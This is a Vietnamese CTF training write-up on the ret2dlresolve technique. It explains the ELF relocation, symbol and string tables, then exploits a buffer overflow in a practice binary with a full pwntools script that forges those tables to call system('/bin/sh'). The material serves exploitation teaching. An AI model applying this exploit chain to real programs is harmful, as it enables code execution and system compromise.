---
title: 'KCSC Trainee Task 5: RET2DLRESOLVE EXPLOIT TECH'

---

# KCSC Trainee Task 5: RET2DLRESOLVE EXPLOIT TECH
![{C4DA3447-4C7A-408A-9534-7C24DDBC98EB}](https://hackmd.io/_uploads/SkbZuVws1x.png)
## OVERVIEW
### Khái niệm RET2DLRESOLVE
- **Ret2dlresolve** là kĩ thuật tấn công mà ở đó cho phép người tấn công sử dụng tùy ý các hàm mà không đòi hỏi địa chỉ libc được leak ra cũng như là không cần tuân theo việc gọi các hàm tồn tại một bảng hàm GOT/PLT có sẵn.
- Kĩ thuật này lợi dụng cơ chế **Dynamic Link** của Linux và **dl-resolve**.
> - **Dynamic Link** là một kiểu liên kết động chương trình với các thư viện; cho phép các con trỏ của chương trình trỏ đến thư viện và tìm được địa chỉ thực thi của hàm thuộc thư viện được gọi trong chương trình thay vì phải nhúng toàn bộ thư viện vào trong chương trình như cơ chế **Static Link**.
> - **dl-resolve** là quá trình Dynamic Link resolve một hàm, biến tại thời điểm chạy chương trình.
> - **Resolve** là thao tác tìm địa chỉ thực thi của một symbol trong thư viện và cập nhật vào bảng GOT. Thông thường nếu một hàm chưa được resolve thì **dl_runtime_resolve()** sẽ được gọi và tìm kiếm địa chỉ của hàm còn thiếu trong thư viện và cập nhật vào bảng GOT. 
> > **dl_runtime_resolve()** là một hàm thuộc **dynamic linker** và cách hoạt động như sau:
> > 1. Chương trình gọi printf@PLT, lúc này printf@PLT, CPU sẽ nhảy vào stub trong .plt thực thi việc kiểm tra GOT.
> > 2. Nếu đã có GOT thì gọi luôn còn GOT chưa có sẵn địa chỉ của printf sẽ thực thi hàm dl_runtime_resolve().
> > 3. dl_runtime_resolve() tìm kiếm địa chỉ printf@GOT trong thư viện (ví dụ là libc.so.6).
> > 4. Cập nhật bảng GOT bằng địa chỉ của printf@GOT.
> > 5. Chương trình tiếp tục và nếu printf được gọi lần nữa thì sẽ nhảy vào printf@GOT thực thi chứ không cần tìm kiếm nữa.
- Với những điều trên thì kẻ tấn công sẽ có thể tận dụng **dl_runtime_resolve()** để gọi các hàm phục vụ cho mục tiêu tấn công và system("/bin/sh") là một ví dụ.
### Các khái niệm liên quan và cách hoạt động của DL_RUNTIME_RESOLVE
- Lấy ý tưởng là việc ta muốn thực thi hàm system("/bin/sh"). Và để làm được điều này thì có 3 khái niệm ta cần phải tìm hiểu lần lượt là JMPREL, SYMTAB, STRTAB.
#### 1.JMPREL
- JMPREL(.rel.plt / .rela.plt) là một cấu trúc phân vùng lưu trữ Relocation Table, các thông tin về các symbol cần resolve khi chương trình gọi hàm thông qua PLT. 
- Cách hoạt động của JMPREL:
> Chương trình gọi hàm printf() và nhảy vào printf@PLT kiểm tra GOT.
> GOT chưa có địa chỉ nên PLT gọi dl_runtime_resolve().
> dl_runtime_resolve() dùng JMPREL dữ liệu từ để tìm symbol tương ứng trong thư viện (ví dụ là libc.so.6).
> Cập nhật GOT với địa chỉ thực của hàm.
> Từ lần gọi sau, chương trình gọi trực tiếp hàm trên từ GOT.
- Cấu trúc:
> Mỗi mục trong JMPREL được lưu dưới dạng ELF32_REL hoặc ELF64_RELA:
> - ELF32_REL:
> ```c=
> typedef uint32_t Elf32_Addr;
> typedef uint32_t Elf32_Word;
> typedef struct
> {
>   Elf32_Addr    r_offset;               /* Địa chỉ entry cần cập nhật */
>   Elf32_Word    r_info;                 /* Relocation type and symbol index (metadata) */
> } Elf32_Rel;
> ```
> - ELF64_RELA:
> ```c=
> typedef struct {
>   Elf64_Addr  r_offset;  /* Địa chỉ entry cần cập nhật */
>   Elf64_Xword r_info;    /* Chứa type & symbol index */
>   Elf64_Sxword r_addend; /* Giá trị bù thêm (chỉ có trong .rela) */
> } Elf64_Rela;
> ```
> > - Trường r_offset(8 bytes) là địa chỉ trong bộ nhớ cần cập nhật (các entry trong GOT hoặc mã chương trình). Khi thực hiện relocation, dynamic linker sẽ sửa đổi nội dung tại địa chỉ này bằng giá trị trả về từ việc resolve.
> > - Trường r_info (8 bytes) chứa index của symbol và loại relocation hoặc gọi chung các yếu tố trên là metadata. Trường có thể được trích xuất dữ liệu như sau:
> > ```c=
> > #define ELF64_R_SYM(i)  ((i) >> 32) /* Lấy index */
> > #define ELF64_R_TYPE(i) ((i) & 0xffffffff) /* Lấy loại */
> > ```
> > > Ta có thể giải mã như sau:
> > > ELF64_R_SYM(r_info) thực hiện trích xuất index của symbol trong .dynsym.
> > > ELF64_R_TYPE(r_info) thực hiện trích xuất loại relocation.
> > - Trường r_addend (8 bytes) Chứa giá trị bù thêm và là đặc trung của ELF64_RELA (giá trị bù thêm là giá trị cần cộng vào chỉ thị và ở cấu trúc RELA thì giá trị này sẽ có sẵn trong các Entry mà không cần phải lấy từ vùng nhớ như REL) có vai trò điều chỉnh giá trị của địa chỉ trả về từ quá trình resolve.
- Trong khai thác:
> Kẻ tấn công có thể tạo một Entry giả trong .rela.plt để ép dl_runtime_resolve() trả về một symbol khác với ban đầu mà cụ thể ở đây là system().
> - Lợi dụng việc chương trình đã gọi một hàm từ PLT (tức là có tồn tại việc sử dụng cơ chế dynamic linker), kẻ tấn công tiến hành tạo một Entry giả thông qua việc thiết lập giá trị cho các tham số trong cấu trúc:
> > r_offset có thể là một địa chỉ GOT giả được cấp phát với giá trị bất kì.
> > r_info được thiết lập để trỏ đến symbol system()
> > r_addend là 0
> - Với các thao tác như tên, một Entry giả đã được tạo lập thành công.
#### 2.SYMTAB
- SYMTAB là một bảng chứa thông tin của các symbol được trong chương trình.
- Vị trí của Symtab có sự khác nhau giữa 2 phương thức liên kết: nằm trong .symtab (static link) và nằm trong .dynsym (dynamic link).
- Cách hoạt động của Symtab:
> Tương tự với JMPREL nhưng JMPREL cung cấp metadata của symbol cần resolve cho dl_runtime_resolve() để dựa vào đó mà tìm kiếm symbol tương ứng trong Symtab(.dynsym).
- Cấu trúc:
> Trong ELF 64-bit, mỗi symbol trong .dynsym được định nghĩa:
> ```c=
> typedef struct
> {
>     Elf64_Word    st_name;    /* Offset đến tên symbol trong .dynsym */
>     unsigned char st_info;    /* Loại symbol */
>     unsigned char st_other;   /* Các symbol của glibc phiên bản dưới 2.2 */
>     Elf64_Half    st_shndx;   /* Section index */
>     Elf64_Addr    st_value;   /* Địa chỉ symbol đã resolve */
>     Elf64_Xword   st_size;    /* Kích thước symbol */
> } Elf64_Sym;
> ```
> - Trường st_name (4 bytes) là offset trỏ vào bảng Strtab ( thuộc .dynsym và là nơi lưu tên của symbol dưới dạng chuỗi). Nếu symbol là "printf" và giá trị st_name = 0x1337 thì tương đương với chuỗi "printf" bắt đầu tại địa chỉ .dynsym + 0x1337.
> - Trường st_info (1 byte) chưa 2 thông tin có kích thước 4 bits bao gồm: 4 bits đầu là Loại symbol và 4 bits cuối là Phạm vi symbol.
> > Ta có thể trích xuất giá trị của 2 thông tin này:
> > ```c=
> > #define ELF64_ST_BIND(i)    ((i) >> 4) /* Lấy phạm vi */
> > #define ELF64_ST_TYPE(i)    ((i) & 0xf) /* Lấy loai */
> > ```
> - Trường st_other chủ yếu kiểm soát sự hiện diện của các symbol, thường có giá trị là 0x0.
> - Trường st_shndx lưu index của section chứa symbol.
> > Các giá trị đặc biệt:
> > - SHN_UNDEF (0x0000) (Undefined symbol) nghĩa là chưa được resolve, cần được tìm trong thư viện.
> > - SHN_COMMON (0xfff2) là symbol chưa được đặt vào section.
> > - SHN_ABS (0xfff1) là symbol có giá trị cố định. 
> - Trường st_value chứa địa chỉ của symbol và tồn tại 2 trường hợp:
> > - Chứa địa chỉ trong bộ nhớ nếu symbol đã resolve.
> > - Có giá trị là 0x0 và cần được xử lý bởi trình liên kết nếu symbol chưa được resolve.
> - Trường st_size chứa kích thước của symbol. Sẽ là 0 hoặc độ dài mã máy nếu là hàm và sẽ là kích thước của biến nếu là biến.
- Trong khai thác:
> Mục tiêu của kẻ tấn công là tạo một Entry giả trong Symtab để trỏ đến system() và có thể được thực hiện như sau:
> 1. Tìm offset của .dynsym trong ELF (có thể dùng readelf -d file)
> 2. Dựng một Entry giả của Elf64_Sym bằng cách gán st_name vào chuỗi "system" trong .dynsym.
> > Có thể được thực hiện bằng các thao tác:
> > - Đặt st_name trỏ đến chuỗi "system" trong .dynsym.
> > - Gán st_info = 0x12 là một hàm toàn cục.
> > - Gán st_value = 0x0 là chưa được resolve.
> > 
> > Bằng cách này Symtab hiện tại đang chứa thông tin của một hàm system() chưa được resolve và kết hợp với một Jmprel fake cũng được thiết lập để trỏ đến hàm system() thì ta hoàn toàn có thể ép dl_runtime_resolve() resolve symbol system().
> 3. Dựng stack payload để thực thi hàm mục tiêu.
#### 3.STRTAB
- STRTAB là bảng chuỗi chứa tên của các symbol, section, string của ELF.
- Gòm các loại phổ biến như:
> - .dynstr: Chứa tên của các symbol động, có thể là các hàm của thư viện như system, printf...
> - .strtab: Chứa tên của các symbol tĩnh, có thể là các biến, các hàm được định nghĩa trong ELF.
> - .shstrtab: Chứa tên của các section (.text, .data, .bss).
- Cấu trúc:
> Bản chất Strtab chỉ là một dãy các chuỗi liên tiếp được ngăn cách bởi các NULL byte.
> Ví dụ: `\x00printf\x00system\x00execve\x00` Trong đó:
> > "printf" được lưu tại offset 0x01.
> > "system" được lưu tại offset 0x08.
> > "execve" được lưu tại offset 0x0f.
> Liên hệ với Symtab thì trường st_name là offset trỏ vào Strtab và ta có ví dụ:
> ```c=
> Elf64_Sym system_sym;
> system_sym.st_name = 0x08;
> ```
> > Vậy system đang nằm tại địa chỉ .dynstr + 0x08.
- Trong khai thác:
> Strtab được lợi dụng để là cơ sở tham chiếu cho các tham số cần thiết của Symtab (ví dụ là thiết lập st_name trỏ đến chuỗi "system" trong .dynstr bằng offset).

- Ta có cách hoạt động tổng quan của 3 khái niệm trên mô phỏng trong một quá trình resolve hàm printf():
- [ ] Bước 1: Chương trình gọi hàm printf().
- [ ] Bước 2: Nhảy vào PLT → Kiểm tra GOT.
- [ ] Bước 3: Nếu GOT chưa có địa chỉ, nhảy đến dl_runtime_resolve().
- [ ] Bước 4: dl_runtime_resolve() tìm index của symbol cần resolve trong JMPREL (bảng .rela.plt).
- [ ] Bước 5: Dùng index trong JMPREL để tìm symbol trong SYMTAB (.dynsym).
- [ ] Bước 6: Lấy tên symbol từ STRTAB (.dynstr).
- [ ] Bước 7: Tìm địa chỉ thực của symbol trong libc, cập nhật vào GOT.
- [ ] Bước 8: Quay lại chương trình, gọi lại hàm với địa chỉ mới từ GOT.
 
- Với việc thông hiểu qua các khái niệm quan trọng trên thì ta có cái nhìn tổng quan về kĩ thuật ret2dlresolve như sau:
> Là kĩ thuật sử dụng cơ chế liên kết động để thao túng gọi hàm tùy ý, khi khai thác ta cần thiết lập các entry fake của JMPREL và SYMTAB dựa vào STRTAB thành các hàm nhằm thỏa mãn mục đích khai thác.
### Lợi ích của RET2DLRESOLVE
- Ret2dlresolve không cần một địa chỉ libc được leak ra để tính toán libc base vì dynamic linker sẽ tự giúp tìm kiếm địa chỉ của hàm.
- Có thể dùng để bypass phương thức bảo mật ALSR.
- Phù hợp cho các challenge tồn tại Full Protection RELRO vì khai thác không cần ghi vào bảng GOT (tùy thuộc vào việc có đủ điều kiện để bypass hay không).
- Tuy nhiên đòi hỏi sự tồn tại của lỗ hỏng mà kẻ tấn công có thể kiểm soát stack, địa chỉ trả về của hàm, thực thi ROP để thực thi và phổ biến nhất là Buffer Overflow. Đồng thời cũng đòi hỏi chương trình được liên kết động.
### Cách RET2LDRESOLVE hoạt động
- Với việc lấy các thông số hàm cần resolve trong các cấu trúc nên đầu tiên nhất ta cần thiết lập các cấu trúc giả và gọi Resolver với tham số là relo_arg trỏ đến frame ta đã fake và chương trình sẽ dựa vào đó mà resolve ra hàm mà ta muốn.
## CHALLENGE PRACTICE
![{C20CA0C8-03A0-4C5F-B142-E072614118FD}](https://hackmd.io/_uploads/B1hyu4vsyg.png)
### IDA
- Ta phân tích hàm main():
```c=
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  const char **v3; // rdx

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  alarm(0x50u);
  vuln(80, 0LL, v3);
  return 0LL;
}
```
> Hàm thực thi việc thiết lập các bộ nhớ đệm và gọi hàm alarm với tham số là 0x50 có ý nghĩa hẹn giờ sau 0x50 giây thì chương trình sẽ kết thúc.
> Hàm vuln()(dạ để cho tiện em rename nó ròi ạ :_) ) được gọi và kết thúc hàm.
- Hàm vuln():
```c=
int __fastcall vuln(int argc, const char **argv, const char **envp)
{
  char s[96]; // [rsp+0h] [rbp-60h] BYREF

  return (unsigned int)fgets(s, 116, stdin);    // Buffer Overflow
}
```
> Hàm thực hiện lấy dữ liệu đầu vào có kích thước 116 bytes cho một mảng kí tự có 96 phần tử.

### Ý TƯỞNG
- Lỗ hỏng ta dễ dàng thấy ở đây là Buffer Overflow trong hàm vuln() và điều này cho phép ta kiểm soát được stack, địa chỉ trả về của hàm và có thể là áp dụng kĩ thuật ROP để thực thi thiết lập các tham số thích hợp để thực thi kĩ thuật ret2dlresolve với mục tiêu là system("/bin/sh").

### KHAI THÁC
#### Checksec
![{C43C76D9-DFB7-46EC-A34D-E9A7AB5A74CC}](https://hackmd.io/_uploads/SkcdctE2kx.png)
Trừ `NX` được bật thì hầu như các phương pháp bảo mật đều được tắt và đặc biệt ở đây ta có thể thao túng `bảng GOT`, có thể điều khiển địa chỉ trả về và đồng thời là sử dụng các địa chỉ hàm của chương trình tùy ý thông qua `No canary` và `No PIE`.
#### Các tham số cơ bản:
Để thực thi kĩ thuật ret2dlresolve đầu tiên ta cần thiết lập các fake frame của Jmprel, Symtab, Strtab. Với relo_arg, sym_num và st_name thì ta cần đến các địa chỉ cơ bản của file là địa chỉ Jmprel, Symtab, Strtab gốc. Sử dụng:
```bash=
readelf -d <chall_name>
```
![{40FCB805-2D61-4879-8300-1E257575746C}](https://hackmd.io/_uploads/S1GGp_E3kx.png)
 Và ta có được các địa chỉ lần lượt là:
```
strtab = 0x3ff568
symtab = 0x3ff5e0
jmprel = 0x4005f0
```
Sau đó ta có thể dễ dàng tính toán các tham số cần thiết qua công thức đã biết, các địa chỉ như rela_addr, sym_addr, strtab_addr sẽ được lấy khi khảo sát một vùng nhớ (có thể ở càng cao càng tốt vì khi gọi resolver thì sẽ tốn khá nhiều dung lượng lưu trữ ở các vùng nhớ thấp hơn và càng cao sẽ tránh được việc ghi đè bảng GOT gây lỗi) có quyền read và write và phải thỏa mãn công thức như ở dưỡi với các tham số kết quả phải là số nguyên:
- Công thức:
```python=
relo_arg = (rela_addr - jmprel)//24
sym_num = (sym_addr - symtab)//24
st_name = (strtab_addr - strtab)
```
- Áp dụng:
```python=
rela_addr = 0x404df0
relo_arg = (rela_addr - jmprel)//24
print(hex(relo_arg))
sym_addr = 0x404e18
sym_num = (sym_addr - symtab)//24
print(hex(sym_num))
strtab_addr = sym_addr+24
st_name = (strtab_addr - strtab)
print(hex(st_name))
```
Lưu ý rằng khi tính toán ta cần in ra các tham số để xem các tham số có tính toán đúng hay không.
Và với các tham số trên khi chạy thử ta có các giá trị được tính toán:
```python=
relo_arg = 0x300
sym_num = 0x3ad
st_name = 0x58c8
```
#### Thiết lập các cấu trúc giả
##### 1. Fake RELA
Như ta đã biết một cấu trúc Rela có cấu trúc trong C như sau:
```c=
typedef struct {
  Elf64_Addr  r_offset;  /* Địa chỉ entry cần cập nhật */
  Elf64_Xword r_info;    /* Chứa type & symbol index */
  Elf64_Sxword r_addend; /* Giá trị bù thêm (chỉ có trong .rela) */
} Elf64_Rela;
```
Vì Resolver sẽ sử dụng các trường r_offset và r_info để tiến hành resolve ra hàm vậy nên ta cần fake giá trị của 2 trường này và trường r_addend ta sẽ set thành 0.
- Với trường r_offset thì ta biết đây sẽ là một GOT entry của hàm cần resolve và ở đây ta sẽ tiến hành kiểm tra bảng GOT để chọn ra entry của một hàm để ta fake:
> ![{D96A3AC7-00A0-4CA6-AF68-401B6B6040AA}](https://hackmd.io/_uploads/BkI6-K4hkl.png)
> Ta sẽ sử dụng entry của fgets để fake và khi resolve thì địa chỉ thực của fgets sẽ là địa chỉ hàm system.
> Vậy ta có giá trị của trường r_offset là: `0x404018`
- Với trường r_info thì đây đóng vai trò như một trường lưu thông tin cơ bản của hàm cần resolve và có thể được truy xuất là index (Sym_num) và loại với công thức:
> ```c=
> #define ELF64_R_SYM(i)  ((i) >> 32) /* Lấy index */
> #define ELF64_R_TYPE(i) ((i) & 0xffffffff) /* Lấy loại */
> ```
> Nên trường này sẽ được tính toán theo công thức:
> ```c=
> r_info = (sym_num << 32) | 0x7
> ```
> Vậy ta dễ dàng có giá trị của r_info là: `0x3ad00000007`

Vậy tổng kết lại ta có được cấu trúc fake rela như sau:
```python=
# Build fake rela
r_offset = p64(exe.got.fgets)
r_info = p64((sym_num << 32) | 0x7)
r_addend = p64(0)
rela_fake = r_offset + r_info + r_addend
print(hex(u64(r_offset)))
print(hex(u64(r_info)))
```

##### 2. Fake Symtab
Ta có cấu trúc của một Symtab trong C:
```python=
typedef struct
{
    Elf64_Word    st_name;    /* Offset đến tên symbol trong .dynsym */
    unsigned char st_info;    /* Loại symbol */
    unsigned char st_other;   /* Các symbol của glibc phiên bản dưới 2.2 */
    Elf64_Half    st_shndx;   /* Section index */
    Elf64_Addr    st_value;   /* Địa chỉ symbol đã resolve */
    Elf64_Xword   st_size;    /* Kích thước symbol */
} Elf64_Sym;
```
Với Symtab thì Resolver sử dụng trường st_name và st_info để resolve hàm nên ta thiết lập:
- st_name: ta đã tính toán giá trị của trường này từ trước vậy nên ta chỉ cần gán vào dưới dạng byte 32 bit.
- st_info: đơn giản đây là loại symbol và ta sẽ set thành giá trị `0x12` có ý nghĩa đây là một hàm toàn cục và được gán dưới dạng byte 8 bit.
Và các giá trị còn lại ta đều set thành 0 và ta có một fake Symtab:
```python=
# Build fake symtab
st_name = p32(st_name)
st_info = p8(0x12)
st_other = p8(0)
st_shndx = p16(0)
st_value = p64(0)
st_size = p64(0)
symtab_fake = st_name + st_info + st_other + st_shndx + st_value + st_size
print(hex(u32(st_name)))
```

##### 3. Fake Strtab
Vì bản chất là một chuỗi các kí tự là tên hàm nên ta sẽ thiết lập chuỗi **system** và padding đủ 8 byte:
```python=
#Build fake strtab
strtab_fake = b"system\0\0"
```
##### Kết nối thành frame:
Ta sẽ tiến hành kết nối các cấu trúc ta đã dựng nên vào với nhau và vì mục tiêu ta là tạo shell với `system("/bin/sh")` nên ý đồ ở đây là khi tiến hành resolve thì hàm mới resolve sẽ được gọi và khi ấy sẽ lấy vào tham số đầu tiên là chuỗi **'/bin/sh'** nên ở cuỗi frame ta cần thêm vào chuỗi trên và ta có tổng thể một fake frame:
```python=
#Sum
fake = rela_fake + p64(0) + p64(0) + symtab_fake + strtab_fake + b'/bin/sh\0'
```
#### Cooking Shell
Với các địa chỉ `rela_addr`, `sym_addr` và `str_addr`, ta sẽ tiến hành ghi môt lượt các frame đã được tổng hợp trong biến `fake` thông qua stack pivot vào địa chỉ bắt đầu của frame là `0x404df0` và sau đó là gọi resolver.
```python=
#Pivoting to the bss 
p1 = b'a'*(ofs-8) + p64(bss+0x50) + p64(vuln+4)
sl(p1)

#Set up the frame
p2 = b'b'*0x10
p2 += fake
p2 = p2.ljust((ofs-8),b'b') 
p2 += p64(0x404e50+0x60) + p64(vuln+4)
sl(p2)

#Call resolver
p3 = b'c'*(ofs)
p3 += p64(resolver) 
p3 += p64(relo_arg)
sl(p3)
```
Tiến hành chạy script và ta có được shell:
![{86D75D3B-4455-428E-AF1A-2F3217580149}](https://hackmd.io/_uploads/Sk32FKE3yl.png)

***Note:** Mặc dù đã có được shell nhưng không thể tương tác mặc dù hàm con của System đã được gọi với các tham số hoàn toàn đúng.*
### FULLSCRIPT
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x4011ad
        b*0x4011b7
        b*0x4011b8
        b*0x401192
        b*0x15555552fda9
        c
        ''')
        input()

        # p = gdb.debug([exe.path],"""
        #     b*0x4011ad
        #     b*0x4011b7
        #     b*0x4011b8
        #     b*0x401192
        #     c
        #     """)
        # return p
        # input()



if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
###########################################################################################
strtab = 0x3ff568
symtab = 0x3ff5e0
jmprel = 0x4005f0

# Formula
# 0x303
rela_addr = 0x404df0
relo_arg = (rela_addr - jmprel)//24
print(hex(relo_arg))
sym_addr = 0x404e18
sym_num = (sym_addr - symtab)//24
print(hex(sym_num))
strtab_addr = sym_addr+24
st_name = (strtab_addr - strtab)
print(hex(st_name))

# Build fake rela
r_offset = p64(exe.got.fgets)
r_info = p64((sym_num << 32) | 0x7)
r_addend = p64(0)
rela_fake = r_offset + r_info + r_addend
print(hex(u64(r_offset)))
print(hex(u64(r_info)))

# Build fake symtab
st_name = p32(st_name)
st_info = p8(0x12)
st_other = p8(0)
st_shndx = p16(0)
st_value = p64(0)
st_size = p64(0)
symtab_fake = st_name + st_info + st_other + st_shndx + st_value + st_size
print(hex(u32(st_name)))

#Build fake strtab
strtab_fake = b"system\0\0"

#Sum
fake = rela_fake + p64(0) + p64(0) + symtab_fake + strtab_fake + b'/bin/sh\0'
##########################################################################################

ofs = 104
vuln = 0x401192
main = 0x4011b8
bss = 0x404df0
resolver = 0x401020

#Pivoting to the bss 
p1 = b'a'*(ofs-8) + p64(bss+0x50) + p64(vuln+4)
sl(p1)

#Set up the frame
p2 = b'b'*0x10
p2 += fake
p2 = p2.ljust((ofs-8),b'b') 
p2 += p64(0x404e50+0x60) + p64(vuln+4)
sl(p2)

#Call resolver
p3 = b'c'*(ofs)
p3 += p64(resolver) 
p3 += p64(relo_arg)
sl(p3)

p.interactive()
```